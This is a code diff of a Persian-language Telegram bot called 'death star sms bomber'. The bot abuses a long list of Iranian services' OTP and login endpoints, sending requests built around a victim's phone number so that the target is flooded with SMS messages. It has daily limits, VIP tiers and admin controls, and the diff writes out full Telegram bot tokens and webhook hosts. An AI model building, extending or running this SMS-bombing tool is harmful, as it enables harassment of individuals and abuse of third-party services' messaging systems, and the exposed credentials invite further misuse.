@@ -15,8 +15,8 @@ import traceback
 from flask import Flask, request
 
 # ========== تنظیمات اصلی ==========
-TOKEN = "8485669315:AAEbEt7ZLNE-Jv6iPDNi76ubZgFe7zEZ5X0"
-ADMIN_IDS = [8226091292, 7620484201]
+TOKEN = "8569730818:AAH_iPHg2IbZLtyKsRMHa_q3aE1UA1F2c7I"
+ADMIN_IDS = [8226091292, 7620484201]  # ادمین‌های ثابت
 BOT_NAME = "𝗱𝗲𝗮𝘁𝗵 𝘀𝘁𝗮𝗿 𝘀𝗺𝘀 𝗯𝗼𝗺𝗯𝗲𝗿"
 CREATOR_USERNAME = "@death_star_sms_bomber"
 
@@ -36,9 +36,8 @@ DAILY_LIMIT_NORMAL = 5
 DAILY_LIMIT_VIP = 20
 bot_active = True
 
-# ========== لیست APIها ==========
+# ========== لیست کامل APIها (۱۴۳ تا) ==========
 APIS = [
-    # ========== APIهای اصلی ==========
     {
         "name": "اسنپ",
         "url": "https://nobat.ir/api/public/patient/login/phone",
@@ -465,7 +464,6 @@ APIS = [
         "data": {"send": "1", "cellphone": "PHONE_NUMBER"},
         "headers": {"Content-Type": "application/x-www-form-urlencoded"}
     },
-    # ========== APIهای اضافی ==========
     {
         "name": "Arzinja Login",
         "url": "https://arzinja.app/api/login",
@@ -916,8 +914,9 @@ APIS = [
         "name": "Digimaze OTP",
         "url": "https://digimaze.org/api/sms/v1/otp/request",
         "data": {"phone": "PHONE_NUMBER"}
-    },
+    }
 ]
+
 # ========== توابع کمکی API ==========
 def get_random_user_agent():
     agents = [
@@ -931,7 +930,10 @@ def prepare_api_data(api, phone):
     phone_without_0 = phone[1:]
     phone_with_prefix = f"+98{phone_without_0}"
     
-    data = api["data"].copy() if isinstance(api["data"], dict) else api["data"]
+    if not isinstance(api["data"], dict):
+        return api["data"]
+    
+    data = api["data"].copy()
     
     def replace_phone(obj):
         if isinstance(obj, dict):
@@ -939,13 +941,15 @@ def prepare_api_data(api, phone):
         elif isinstance(obj, list):
             return [replace_phone(item) for item in obj]
         elif isinstance(obj, str):
-            if obj == "PHONE_NUMBER": return phone
-            if obj == "PHONE_NUMBER_WITHOUT_0": return phone_without_0
-            if obj == "+98PHONE_NUMBER_WITHOUT_0": return phone_with_prefix
-            if "RANDOM" in obj: return obj.replace("RANDOM", str(random.randint(100, 999)))
-            return obj
+            if obj == "PHONE_NUMBER":
+                return phone
+            elif obj == "PHONE_NUMBER_WITHOUT_0":
+                return phone_without_0
+            elif obj == "+98PHONE_NUMBER_WITHOUT_0":
+                return phone_with_prefix
+            elif "RANDOM" in obj:
+                return obj.replace("RANDOM", str(random.randint(100, 999)))
         return obj
-    
     return replace_phone(data)
 
 def send_api_request(api, phone):
@@ -1030,11 +1034,9 @@ def init_database():
         conn.commit()
         conn.close()
         return True
-    except Exception as e:
-        print(f"❌ Database error: {e}")
+    except:
         return False
 
-# ========== توابع دیتابیس ==========
 def get_user_daily(user_id):
     try:
         conn = sqlite3.connect('bot_data.db')
@@ -1052,8 +1054,7 @@ def update_user_daily(user_id, count):
         conn = sqlite3.connect('bot_data.db')
         c = conn.cursor()
         today = datetime.now().date().isoformat()
-        c.execute("INSERT OR REPLACE INTO user_daily (user_id, date, count) VALUES (?, ?, ?)",
-                  (user_id, today, count))
+        c.execute("INSERT OR REPLACE INTO user_daily (user_id, date, count) VALUES (?, ?, ?)", (user_id, today, count))
         conn.commit()
         conn.close()
     except:
@@ -1077,8 +1078,7 @@ def set_user_last_use(user_id, timestamp):
     try:
         conn = sqlite3.connect('bot_data.db')
         c = conn.cursor()
-        c.execute("INSERT OR REPLACE INTO user_last_use (user_id, last_use) VALUES (?, ?)",
-                  (user_id, timestamp))
+        c.execute("INSERT OR REPLACE INTO user_last_use (user_id, last_use) VALUES (?, ?)", (user_id, timestamp))
         conn.commit()
         conn.close()
     except:
@@ -1091,14 +1091,12 @@ def increment_user_messages(user_id):
         c.execute("SELECT count FROM user_messages WHERE user_id = ?", (user_id,))
         result = c.fetchone()
         current = result[0] if result else 0
-        c.execute("INSERT OR REPLACE INTO user_messages (user_id, count) VALUES (?, ?)",
-                  (user_id, current + 1))
+        c.execute("INSERT OR REPLACE INTO user_messages (user_id, count) VALUES (?, ?)", (user_id, current + 1))
         conn.commit()
         conn.close()
     except:
         pass
 
-# ========== مدیریت ادمین و VIP ==========
 def is_admin(user_id):
     if user_id in ADMIN_IDS:
         return True
@@ -1106,9 +1104,7 @@ def is_admin(user_id):
         conn = sqlite3.connect('bot_data.db')
         c = conn.cursor()
         c.execute("SELECT user_id FROM admins WHERE user_id = ?", (user_id,))
-        result = c.fetchone()
-        conn.close()
-        return result is not None
+        return c.fetchone() is not None
     except:
         return False
 
@@ -1117,9 +1113,7 @@ def is_vip(user_id):
         conn = sqlite3.connect('bot_data.db')
         c = conn.cursor()
         c.execute("SELECT user_id FROM vip_users WHERE user_id = ?", (user_id,))
-        result = c.fetchone()
-        conn.close()
-        return result is not None
+        return c.fetchone() is not None
     except:
         return False
 
@@ -1206,7 +1200,6 @@ def hash_phone(phone):
 def is_phone_blocked(phone):
     return hash_phone(phone) in BLOCKED_PHONE_HASHES
 
-# ========== خوش‌آمدگویی ==========
 def get_welcome_message(user):
     name = user.first_name or "عزیز"
     today_used = get_user_daily(user.id)
@@ -1258,13 +1251,10 @@ def global_stats(m):
     try:
         conn = sqlite3.connect('bot_data.db')
         c = conn.cursor()
-        c.execute("SELECT COUNT(DISTINCT user_id) FROM user_daily")
-        total_users = c.fetchone()[0] or 0
+        total_users = c.execute("SELECT COUNT(DISTINCT user_id) FROM user_daily").fetchone()[0] or 0
         today = datetime.now().date().isoformat()
-        c.execute("SELECT COUNT(DISTINCT user_id) FROM user_daily WHERE date = ?", (today,))
-        today_users = c.fetchone()[0] or 0
-        c.execute("SELECT SUM(count) FROM user_messages")
-        total_msgs = c.fetchone()[0] or 0
+        today_users = c.execute("SELECT COUNT(DISTINCT user_id) FROM user_daily WHERE date = ?", (today,)).fetchone()[0] or 0
+        total_msgs = c.execute("SELECT SUM(count) FROM user_messages").fetchone()[0] or 0
         conn.close()
         
         msg = f"""📊 **آمار کلی:**
@@ -1525,7 +1515,7 @@ def health():
 @app.route('/setwebhook')
 def set_webhook():
     try:
-        url = "https://top-topye-1.onrender.com/webhook"
+        url = "https://hosawerdty.onrender.com/webhook"
         bot.remove_webhook()
         time.sleep(1)
         return (f"✅ Webhook set to {url}" if bot.set_webhook(url=url) else "❌ Failed"), 200
